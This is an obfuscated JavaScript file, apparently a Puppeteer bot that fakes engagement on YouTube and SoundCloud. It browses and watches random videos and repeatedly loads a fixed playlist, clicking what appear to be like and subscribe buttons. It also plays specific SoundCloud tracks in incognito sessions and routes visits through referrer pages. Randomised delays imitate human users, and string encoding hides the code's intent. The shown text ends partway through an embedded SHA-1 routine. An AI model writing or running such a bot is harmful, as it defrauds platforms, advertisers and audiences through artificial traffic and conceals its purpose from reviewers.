function a() {
  const bl = [
    'zwfZDcb0zwfTla',
    'gsTLWRytpG',
    '-requestho',
    'BCklEaiLW63dV8kpoSkF',
    'vu1XterOBdHqwa',
    'juuZjtGWjtGXjq',
    '/zyenith/M',
    'W5Tlk29RW4GcW5RcTcS',
    'W4VcQCk7W7eLm8ogWRhcKhi',
    'BxvSys9cExbHCW',
    'ilation,mi',
    'j8kvW5/cPCkcW5TfWOHfkG',
    'jCkRcN3cKmk6qudcMSks',
    'y29Tp3bHz2u9oq',
    'vwFdH8ogWOmsvmkjt8kk',
    'y2HHDgDWDc1VBG',
    'BYXTCIbIzwfZDa',
    'ai-wave-21',
    'sudiparyal',
    'ange;v=b3;',
    'pts/by-sit',
    'WRNdQMRcNhhcL8oZwqBcOq',
    'h8kpWQynqu40W6PVW58',
    'tw9KC18Otw9Vtq',
    '-play-butt',
    'nLDVC3fnCtLLAG',
    'BtncqwHLmxDZBa',
    'children',
    'parent-hei',
    'ChrZl2j5lxnPDa'
  ];
  a = function() {
    return bl;
  };
  return a();
}
const X = d,
  W = c,
  V = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x7b * 0x22 + -0x91a * 0x3 + 0xaf9))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x1e97 + 0x85 * 0x1e + -0x2e2d), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0xc222 + -0x212f + 0x803 * 0x2b + (0x1 * 0x73cc + 0x3995 * -0x1 + 0x61) * random()) : await standardWaitForNetIdle(f), await wait(-0x33 * 0x7a + -0x4 * 0x237 + 0x2c6 * 0x13 + (-0x1 * -0x4207 + 0x98c + -0xd * 0x2cf) * random()), -0x1b8f + 0x215 * -0x11 + -0x47 * -0xe3;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x15f2 + 0x4 * 0x56e + 0x1 * -0x1822), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x2 * -0x874 + -0x1611 + 0x26fa;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1209 + 0x5ed + 0x26c * 0x5);
    let h = e[f];
    if (b['YSUCPL'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x307 * 0x7 + -0x15bb + -0x45 * -0x2, s, t, u = 0x1 * 0x6d1 + 0x2458 + -0x17d * 0x1d; t = n['charAt'](u++); ~t && (s = r % (-0x13f * -0x1 + 0x190d + 0x1d * -0xe8) ? s * (-0x43 * 0x90 + 0x420 + 0x21d0) + t : t, r++ % (0x202d * -0x1 + -0x4e * 0x66 + 0x1 * 0x3f45)) ? p += String['fromCharCode'](0x35 + 0x19a3 + -0x18d9 & s >> (-(-0x1 * -0x1a9f + 0x2cd * -0x6 + 0x3 * -0x345) * r & 0x137f + -0x1e * 0x48 + -0xb09)) : 0x215 * -0x11 + -0x10 * 0x265 + 0x49b5 * 0x1) {
          t = o['indexOf'](t);
        }
        for (let v = 0x2b * -0x97 + -0x7 * -0x4c7 + -0x814, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x1dc4 + 0x56a + -0x118f * 0x2))['slice'](-(-0x3 * 0x2fb + -0x1 * -0x1daf + 0xa5e * -0x2));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1 * -0x12df + 0x1 * -0x63a + 0xd * -0xf9,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1028 * -0x1 + -0x2188 + 0x31b0; u < 0x1d72 + 0x75 * 0xd + 0x2263 * -0x1; u++) {
          p[u] = u;
        }
        for (u = -0x3 * -0x30 + -0x93 * -0x3c + -0x1 * 0x2304; u < -0x13a6 + 0x2565 + -0x10bf; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x194 * 0x4 + 0x1d * 0x1 + -0x56d), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x5a * -0x2d + 0x256b + -0x1599, q = 0x1 * -0x251d + -0x25c1 + 0x559 * 0xe;
        for (let v = 0x1d32 + -0x135d * 0x1 + 0x3 * -0x347; v < n['length']; v++) {
          u = (u + (0x1 * 0x14d9 + -0x21 * -0xbf + -0x2d77)) % (-0x1f7f + -0xbc4 + 0x2c43), q = (q + p[u]) % (0xad * 0x17 + -0x2346 + 0x14bb), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1510 + -0x1a31 + -0x3041 * -0x1)]);
        }
        return t;
      };
      b['xMvLBi'] = m, c = arguments, b['YSUCPL'] = !![];
    }
    const j = e[0xf0 + 0x5 * 0x1bb + -0x997 * 0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['mzThRt'] === undefined && (b['mzThRt'] = !![]), h = b['xMvLBi'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function randomWait() {
  return await wait(0xe73 + 0x7 * -0x4ee + 0x2797 + (0xdbe * 0x2 + -0x1 * 0x2af + -0x13 * 0x47) * random()), 0x9 * 0x2de + 0x97 + -0x1a64;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = d;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + R(0x1c) + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0xfba + 0x24d7 + 0x1 * -0x3491, 0x9a2 * -0x3 + 0x1 * 0x1feb + 0x2fe * -0x1), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x47bc + -0x1 * -0x14532 + -0x1316) * getRandomInt(0x2565 + -0x97b + 0x1 * -0x1be8, 0x155 * 0xa + 0x1e98 + -0x2be5), h)), -0x1f * -0x135 + 0x1839 + -0x3da3;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x25c1 * 0x1 + 0xfe * 0x8 + -0x11 * -0x1c1;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x8b4 + 0x1 * 0x265 + 0xca * 0x8]['split']('\x20');
    for (let k = -0x16 * -0x151 + 0x6d + -0x1d63; k < i['length']; k += -0xbc4 + -0x58b + -0x1151 * -0x1)
      j += i[k] * h[i[k + (0x10f3 + 0x1c10 + -0x2d02)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x1a31 + -0xac7 * 0x1 + 0x2 * 0x127f)['map'](l => Array['from'](l['children']))['flat'](0x44 * -0x14 + 0x1aab + -0x155a)['map'](l => l['childNodes'][0x1 * 0x79a + 0x7f6 * 0x1 + 0x7 * -0x239]['childNodes'][-0x1e1d * -0x1 + -0xdc3 + -0x105a]['childNodes'][-0x858 + 0x63 * -0x19 + 0x1204]['childNodes'][-0x14 * 0x143 + 0x1457 + 0x1 * 0x4e5]['childNodes'][-0x1f49 + 0x1b1a + 0x430]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x908 + -0x172a + 0x241a * 0x1, -0x26e * -0xf + 0x3d0 * -0x2 + 0x1 * -0x94a)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0xe * 0x69 + 0x5fd0 + -0x2af6);
  const h = await getMaxTime(f),
    i = Math['min']((-0xcb9 * 0x1f + 0x5 * 0xbd2 + -0x29 * -0xde5) * getRandomInt(-0xc71 * 0x2 + 0x1cd * -0x11 + 0x3781, 0x1 * 0x11b7 + 0x132a + -0x24dc), h);
  return await wait(i), 0x1207 + -0x26d2 + 0x14cc;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const S = d;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x26fc + 0x9ab + 0x4f * 0x5f]['children'][0x101 * -0x22 + 0x6 * -0x31 + 0x2348]['children'][-0x387 + -0xb1 * 0x16 + -0xd * -0x171]['children'][0x1e40 + 0x26f * -0x9 + -0x859][S(0x1b)][0x14b7 * 0x1 + 0x1ba6 + -0x305d]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x411 * -0x7 + -0x2 * 0xd8e + -0x2 * -0x1bca;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x434 * -0x4 + 0x1e12 + 0x43a * -0xb + (0x10a5 * 0x1 + -0x28d * -0x1 + 0x2 * -0x980) * random()
  }), await wait(0x13d0 + 0x1319 * -0x2 + -0x1456 * -0x1 + (0xee9 + 0x1 * 0x551 + 0x21e * -0x9) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x23 * -0xa2 + -0x1114 * 0x1 + 0x3e * 0xa2]['childNodes'][0x1495 * -0x1 + 0x10a7 + 0x3ef]['childNodes'][-0x33 * 0xc4 + 0xdbd * 0x1 + 0x1950]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x247 * -0x7 + 0x1690 + -0x82 * 0xd]['childNodes'][-0x278 * -0xd + -0x1521 * 0x1 + -0xaf7 * 0x1]['childNodes'][0x662 * 0x3 + -0x986 + -0x2 * 0x4cf]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x1f * 0x56 + 0x125 * 0xb + -0x22c * 0x1),
          r = -0x25e4 + -0x22a2 + 0x4886;
        for (let u = 0x1ed6 + 0x974 + 0x36 * -0xbf; u < q['length']; u += -0x679 * -0x1 + -0x189 * 0x11 + 0x9d1 * 0x2)
          r += q[u] * k[q[u + (0x770 + -0x1b5 * -0x2 + -0xad9)]];
        return r;
      }(n);
  });
  await wait((-0x6ac4 + 0x3372 + 0x823 * 0xe) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x7575 * 0x3 + 0xae7 * -0x11 + 0x30416) * getRandomInt(-0x5b * -0x63 + -0x217c * -0x1 + -0x6 * 0xb72, -0x213e + 0x3c1 * -0x8 + -0x7ea * -0x8), h + (-0x462 + -0x1c3c + 0x3426));
  return await wait(i), -0x35 * -0x8b + -0x232d + 0x667;
}
async function keyWatch(f) {
  const T = b;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x25b + -0x36b * -0x5 + 0x13 * -0x106), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + T(0x3, 'a(#v') + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        const U = d;
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + U(0x18) + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x24bc + -0x1 * -0x66d + -0x1f71 + (0x1c0f * -0x1 + -0x479 + 0x2470) * Math['random']());
    });
  }, 0x1f8b + 0x4 * 0x7f6 + -0x240b * 0x1);
  await wait(0x5cb7e + -0x3282d * -0x1 + -0x45fcb);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x9 * 0x1fad + 0x173fd + -0xe17 * 0x1e) * getRandomInt(0x1 * -0x1a8 + 0xd * -0x255 + 0x1 * 0x1ffd, -0x126a * 0x1 + -0x62 * -0x64 + 0x2d3 * -0x7)), clearInterval(h), -0x1 * -0x56d + 0xaf6 * 0x1 + -0x1062;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x77b + -0x897 * 0x3 + 0x124a;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x1 * -0xad5 + 0x1394 + -0x8 * 0x3cd;
    await randomWait();
  }
  return 0x182f + 0x3 * 0x954 + -0x4be * 0xb;
}

function fetchRandomSC() {
  return Math['random']() <= 0xa97 + -0x1 * -0x537 + -0xfce + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x16eb * -0x1 + 0x26d2 + -0xfe7 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1209 + 0x5ed + 0x26c * 0x5);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x22b9 + 0x137 * 0x1 + -0x730 * 0x5 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x5 * 0x1ce + 0x1 * -0x2389 + 0x1a83;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x15b5b + 0x111b * 0x1 + 0x1fa08 * 0x1 + getRandomInt(0x11c + -0x6621 * -0x1 + -0x2ca5, -0xdfc2 + -0x9067 + 0x1e559));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0xdfa + -0x1fd8 + 0x11df), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x211a + -0x10d0 + -0x31ea * -0x1;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x1a68 + -0x1dae + -0x2 * -0x1c0b, -0xe * 0x84 + 0x50e * -0x4 + 0x1 * 0x1ba2)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x15 + -0xa * 0x5 + -0x13 * -0x6d + floor((0x26f0 + 0x136f + -0x3677) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0xa6e85a * -0x117 + 0x5057197 * -0x26 + 0x835588 * 0x3d0),
          0x5b77c8 + 0x2ff9 * 0x1d9 + -0x341ad9,
          0x46bc + 0x1 * 0x51c1 + -0x187d,
          -0x2342 + 0xc72 + 0x1750
        ], y = [
          0x35c + 0x1b78 + -0x1ebc,
          -0x22e1 * -0x1 + -0x1d9f + -0x7 * 0xbe,
          -0xbf6 + -0x12b3 * 0x2 + 0x3164,
          -0x2fa * -0x8 + 0x8f8 + -0x20c8
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x221 * -0xb + -0x1e9d + 0x733)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x1d1 + -0x2 * -0x86f + -0x12af; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x1724 + 0x27d + 0x14a7) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x9 * 0xcd + 0xd0f + 0x511 * -0x4] = A[-0x1613 + -0x1c1e * -0x1 + -0x5fb * 0x1] = A[-0x2 * -0x266 + 0x13ea + -0x18b5] = A[-0x1 * 0x1553 + -0x10b * 0x20 + 0x36b5] = A[-0x196 + 0x1 * -0x242 + 0x3db] = A[0x1d * 0x4f + 0x1 * -0xb29 + 0x23a] = A[0x20 * 0x6f + -0x2f * -0xd1 + 0x776 * -0x7] = A[0x1bb3 + -0x2630 + 0xa83] = A[-0x1fce + 0x2 * -0x6a1 + 0x671 * 0x7] = A[0x9d9 + 0xe2 * 0x4 + -0xd59] = A[-0x1fb2 * 0x1 + -0x23c5 + 0x40 * 0x10e] = A[0x1c30 + -0xdb7 + 0x1 * -0xe6f] = A[-0x14e1 + 0x10f9 + 0x151 * 0x3] = A[0x8 * 0x6a + 0x7 * 0x279 + -0x1493] = A[-0x521 + -0x1718 + 0x40a * 0x7] = A[0x2 * -0x10ec + 0x1e85 + 0x361] = A[0x1 * -0x18ee + -0x1 * 0xc4f + -0xe * -0x2aa] = 0x2b3 * 0x3 + -0x1 * 0xb3f + 0x193 * 0x2, this['blocks'] = A) : this['blocks'] = [
                0x1 * 0x1e17 + 0x235 * -0xa + 0x1 * -0x805,
                0x2244 + 0x31 * 0x73 + 0x3847 * -0x1,
                0xe18 + -0x8 * 0x3dc + 0x10c8,
                -0x2062 + -0x1 * -0x1224 + 0xe3e,
                -0xaa8 + 0x2 * -0xcb4 + 0x2 * 0x1208,
                -0x122b * -0x1 + -0x4cf * -0x6 + -0x2f05,
                0xd97 + -0x2 * 0x8ec + -0x63 * -0xb,
                -0x3d * 0x39 + 0x1e2f + 0xaa * -0x19,
                0xca0 + 0x1ec0 + -0x2b60,
                -0x14b9 + 0xc1b + 0x89e,
                0x3a * -0xa7 + 0x1 * 0x5b5 + 0x2021,
                -0x5e * -0x61 + -0x20ea * 0x1 + 0x15a * -0x2,
                -0x71f + 0x1d66 + 0x1647 * -0x1,
                0x22e1 * -0x1 + -0x753 + -0x124 * -0x25,
                0x135e + 0x3c2 * 0x8 + 0x57e * -0x9,
                -0x3 + 0x2cb * -0x9 + 0x1926,
                -0x16a2 + -0x1188 + 0x282a * 0x1
              ], this['h0'] = 0x8839b3cc + -0x904c394d + 0x1 * 0x6f57a882, this['h1'] = 0x12203ac69 + 0x2c917eac + 0x314c * -0x1ec31, this['h2'] = 0x7b6accab * 0x1 + -0x10aab9ddb + 0x127fbae2e, this['h3'] = -0x115d1723 * 0x1 + 0x1 * 0xd11830f + 0x2521 * 0x8d4a, this['h4'] = 0x164585df6 + -0x9ca92ee6 + 0x4 * -0xf71348, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x3 * 0x47f + 0xae2 + -0x185f, this['finalized'] = this['hashed'] = 0x1a0f + -0x195f + -0x2c * 0x4, this['first'] = 0x47 * -0x1d + 0x85d * -0x4 + 0x10 * 0x298;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1 * 0x23f2 + -0x3b7 * -0x7 + -0x3df3, O = J['length'] || 0x1e99 + 0x1 * 0xd70 + -0x2c09, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x5f2 * -0x2 + -0x1636 * -0x1 + -0xa52, P[-0xc1 + -0x24a5 + 0x2566] = this['block'], P[0x12dd + 0xf4f + -0x221c] = P[-0x1c8 + -0x204d * -0x1 + 0x24 * -0xd9] = P[-0xa46 + -0xa * -0x1e2 + 0x1 * -0x88c] = P[-0x47 * -0x2b + 0x45b * 0x3 + -0x1 * 0x18fb] = P[0xbb7 + -0xe * -0x10d + -0x1 * 0x1a69] = P[-0xa10 + 0x3e * 0x67 + -0xedd] = P[0x1 * 0x24eb + -0x2605 + 0x120] = P[-0x2416 + -0x1bd7 * 0x1 + 0x3ff4] = P[-0x139b + -0x4 * -0x98e + -0x1295] = P[-0x1aa6 + 0x2102 + -0x653] = P[-0x1425 + -0x2576 + 0x39a5] = P[-0x7 * -0xf7 + 0x623 * -0x5 + 0x17f9] = P[0x176f + 0x24bc + 0x3c1f * -0x1] = P[0x1f0b + 0x26ed * -0x1 + 0x7ef] = P[-0x1 * 0xbaa + -0xb * -0x151 + -0x65 * 0x7] = P[0x9 * -0x9b + -0x260b + 0x2b8d] = 0x75f + 0x65 * 0x2b + -0x1856), K) {
                    for (N = this['start']; M < O && N < 0x2184 + 0xcbf + -0x2e03 * 0x1; ++M)
                      P[N >> -0x24f1 + 0x1687 + 0x736 * 0x2] |= J[M] << y[-0x328 * 0x1 + 0x2b7 * 0x1 + 0x74 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x1e30 + -0x1522 + 0x3392; ++M)
                      (L = J['charCodeAt'](M)) < 0x143e + -0x7ce + -0xbf0 ? P[N >> 0x238 * -0xd + -0x5 * 0x230 + 0x27ca] |= L << y[0xbfd + -0x17a7 + -0x1ab * -0x7 & N++] : L < 0x17 * -0x8c + 0xc9a * 0x3 + -0x113a ? (P[N >> -0x2362 + 0x16 * 0x1af + -0x1a6] |= (-0x1ace + 0x1e6d + -0x23 * 0x15 | L >> -0x39 * 0xad + 0x25ee + 0x9d) << y[0x2042 + 0x123c + -0x327b & N++], P[N >> 0xb85 + 0xdc4 * 0x1 + -0x1947] |= (0x133f + 0x2620 + 0x279 * -0x17 | -0x25c4 + -0x532 + 0x2b35 & L) << y[0x1a70 * 0x1 + 0x2c * 0x7 + -0x1ba1 & N++]) : L < 0x6160 + -0x1c * -0x14f + 0x51fc || L >= -0x5ea * 0x1a + -0x6f20 + 0x1e8e4 ? (P[N >> -0x5 * 0x60 + 0xd71 * 0x1 + -0xb8f] |= (-0x257 + -0x235a + -0x1 * -0x2691 | L >> -0x17ec + -0x1 * 0x1037 + 0x282f) << y[0x2 * -0xebb + 0x3f9 + -0x2 * -0xcc0 & N++], P[N >> 0x1d * 0xe2 + 0x332 + -0x1cca] |= (0x4f3 + -0x83 * 0x6 + -0x161 | L >> -0xa74 * -0x2 + 0x2705 + -0x3be7 & -0x249c + 0x1 * -0xccd + 0x31a8) << y[-0x1be6 + 0x830 + 0x13b9 & N++], P[N >> 0x11 * -0x17b + 0x57a * -0x3 + 0x299b] |= (0x17 * 0x14b + -0xa * -0x2d5 + 0x1 * -0x398f | -0x145a + -0x205f * 0x1 + -0x28 * -0x153 & L) << y[0xd30 + -0x239f + 0x1672 & N++]) : (L = 0x391b * 0x1 + 0x3 * -0x2ceb + 0x14da6 + ((0x1d1 + -0xe6f + 0x109d * 0x1 & L) << -0xb7b + -0x4c0 + -0x7 * -0x253 | -0xde5 + 0x11ac + 0x4 * 0xe & J['charCodeAt'](++M)), P[N >> -0x1 * 0xa4a + -0x1 * 0x24c2 + 0x2f0e] |= (0x216 + -0x514 + 0x3ee | L >> -0x1 * -0x6fb + 0x759 + -0xe42) << y[0x551 * 0x3 + -0x377 + -0xc79 & N++], P[N >> 0xa31 + 0xb * 0x379 + -0x3062] |= (0x268d + -0x9b4 + -0x1c59 | L >> -0x1545 + -0xa * -0x337 + -0xad5 & -0x1da5 * 0x1 + -0x1888 + 0x366c) << y[0x1a18 + 0xa3 * 0x4 + -0x98b * 0x3 & N++], P[N >> 0x1978 + -0x1c0b + 0x295] |= (0x21df + 0xe89 + 0x49 * -0xa8 | L >> -0x1cd0 + 0x421 * -0x1 + -0x1 * -0x20f7 & 0xc9b + 0x227 * 0x5 + -0x171f) << y[-0x34 * 0x1f + -0x1703 * -0x1 + -0x10b4 & N++], P[N >> 0x8e1 * -0x1 + 0x123d + 0x39 * -0x2a] |= (-0x21d7 + 0x3b3 * 0x9 + 0x10c | -0x1 * 0x16e4 + -0x2706 + 0x3e29 * 0x1 & L) << y[0x1 * 0x153a + 0x1 * -0x595 + -0xfa2 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1d * -0xbf + -0x3 * -0x509 + -0x247e ? (this['block'] = P[-0x97 * -0x12 + -0x303 * -0x1 + -0xd91], this['start'] = N - (0xca8 + 0x14b6 * -0x1 + -0x84e * -0x1), this['hash'](), this['hashed'] = -0x1ed * 0x13 + 0xfd * -0x14 + 0x385c) : this['start'] = N;
                }
